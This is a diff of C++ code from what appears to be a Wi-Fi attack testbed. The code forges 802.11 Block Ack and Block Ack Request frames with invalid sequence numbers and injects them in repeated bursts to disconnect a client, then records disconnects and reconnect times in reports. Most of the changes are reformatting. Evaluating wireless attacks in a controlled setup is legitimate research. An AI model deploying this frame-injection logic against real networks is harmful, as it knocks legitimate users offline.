@@ -9,6 +9,7 @@
 #include <thread>
 #include <nlohmann/json.hpp>
 
+#include "default.h"
 #include "attacks/components/setup_connections.h"
 #include "attacks/components/sniffer_helper.h"
 #include "config/RunStatus.h"
@@ -43,8 +44,8 @@ RadioTap get_BAR_frame(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac, 
 
 RadioTap get_BA_frame(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac){
 	Dot11BlockAck ba(ap_mac, sta_mac); // STA(attacker) -> AP
-	ba.fragment_number(4);           // invalid FN
-	ba.start_sequence(1175);         // random invalid SSN
+	ba.fragment_number(4);             // invalid FN
+	ba.start_sequence(1175);           // random invalid SSN
 	ba.bar_control(0x0004);
 	const vector<uint8_t> payload_data = {
 		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
@@ -61,7 +62,8 @@ struct BARSContext{
 	atomic<bool> stop{false};
 };
 
-static void bars_sniffer_thread(const HWAddress<6> &sta_mac, const string &iface, BARSContext &ctx, const int timeout_sec
+static void bars_sniffer_thread(const HWAddress<6> &sta_mac, const string &iface, BARSContext &ctx,
+								const int timeout_sec
 ){
 	const string filter = "wlan type data subtype qos-data and wlan addr2 " + sta_mac.to_string();
 
@@ -114,12 +116,11 @@ void block(const HWAddress<6> &sta_mac, const HWAddress<6> &ap_hw, const string 
 
 			if(attack_type == "BAR") block_frame = get_BAR_frame(ap_hw, sta_hw);
 			if(attack_type == "BA") block_frame = get_BA_frame(ap_hw, sta_hw);
-			if(attack_type == "BARS")
-				block_frame = get_BAR_frame(ap_hw, sta_hw, bars_ctx.current_fn.load(), bars_ctx.current_sn.load());
+			if(attack_type == "BARS") block_frame = get_BAR_frame(ap_hw, sta_hw, bars_ctx.current_fn.load(),
+																bars_ctx.current_sn.load());
 
 			log(LogLevel::DEBUG, "Sending batch {}", iteration);
-			for(int i = 0; i < 30; ++i)
-				sender.send(block_frame, iface_obj);
+			for(int i = 0; i < 30; ++i) sender.send(block_frame, iface_obj);
 			this_thread::sleep_for(100ms);
 			iteration++;
 		} catch(const exception &e){
@@ -136,17 +137,16 @@ static Bl0ckResult compute_result(const RunStatus &rs){
 		const auto disc_times = get_time_logs(rs, "client", "CTRL-EVENT-DISCONNECTED");
 		r.disconnect_count = static_cast<int>(disc_times.size());
 		const auto conn_times = get_time_logs(rs, "client", "CTRL-EVENT-CONNECTED");
-		for(const auto &disc : disc_times){
-			for(const auto &conn : conn_times){
+		for(const auto &disc: disc_times){
+			for(const auto &conn: conn_times){
 				if(conn > disc){
 					r.reconnect_times_ms.push_back(
-						static_cast<double>(duration_cast<milliseconds>(conn - disc).count())
-					);
+						static_cast<double>(duration_cast<milliseconds>(conn - disc).count()));
 					break;
 				}
 			}
 		}
-	}else if(rs.get_actor("access_point")->is_WB()){
+	} else if(rs.get_actor("access_point")->is_WB()){
 		r.ap_disconnected = !get_time_logs(rs, "access_point", "AP-STA-DISCONNECTED").empty();
 	}
 	//FIXME log if passed
@@ -159,7 +159,7 @@ static Bl0ckResult compute_result(const RunStatus &rs){
 }
 
 static Bl0ckResult load_result(const RunStatus &rs){
-	const path p = rs.run_folder() / "result.json";
+	const path p = rs.run_folder() / RESULT_NAME;
 	ifstream f(p);
 	if(!f.is_open()){
 		log(LogLevel::WARNING, "result.json not found, recomputing");
@@ -169,8 +169,8 @@ static Bl0ckResult load_result(const RunStatus &rs){
 	Bl0ckResult r{};
 	//r.passed           = j.value("passed", false);
 	r.disconnect_count = j.at("disconnect_count").get<int>();
-	if(j.contains("ap_disconnected") && !j.at("ap_disconnected").is_null())
-		r.ap_disconnected = j.at("ap_disconnected").get<bool>();
+	if(j.contains("ap_disconnected") && !j.at("ap_disconnected").is_null()) r.ap_disconnected = j.at("ap_disconnected").
+			get<bool>();
 	r.reconnect_times_ms = j.value("reconnect_times_ms", vector<double>{});
 	return r;
 }
@@ -204,8 +204,7 @@ void run_bl0ck_attack(RunStatus &rs){
 	rs.process_manager.stop_all();
 	Bl0ckResult r = compute_result(rs);
 	rs.save_result({
-		{"disconnect_count", r.disconnect_count},
-		{"ap_disconnected", r.ap_disconnected},
+		{"disconnect_count", r.disconnect_count}, {"ap_disconnected", r.ap_disconnected},
 		{"reconnect_times_ms", r.reconnect_times_ms}
 	});
 }
@@ -217,8 +216,7 @@ void stats_bl0ck_attack(const RunStatus &rs){
 	rs.log_events(elements, {
 					{"access_point", "did not acknowledge", "ACK_fail", "red"},
 					{"client", "CTRL-EVENT-DISCONNECTED", "DISCONN", "red"},
-					{"client", "CTRL-EVENT-CONNECTED", "CONN", "green"},
-					{"client", START_tag, "START", "black"},
+					{"client", "CTRL-EVENT-CONNECTED", "CONN", "green"}, {"client", START_tag, "START", "black"},
 					{"client", END_tag, "END", "black"},
 				});
 
@@ -242,12 +240,11 @@ void stats_bl0ck_attack(const RunStatus &rs){
 								});
 
 	const path attacker_graph = observer::tshark::tshark_graph(rs, "attacker", elements);
-	const path client_graph   = observer::tshark::tshark_graph(rs, "client", elements);
+	const path client_graph = observer::tshark::tshark_graph(rs, "client", elements);
 
 	const Bl0ckResult result = load_result(rs);
 	generate_report(rs, result, attacker_graph, client_graph);
 
 	log(LogLevel::INFO, "Bl0ck attack stats done");
 }
-
 }
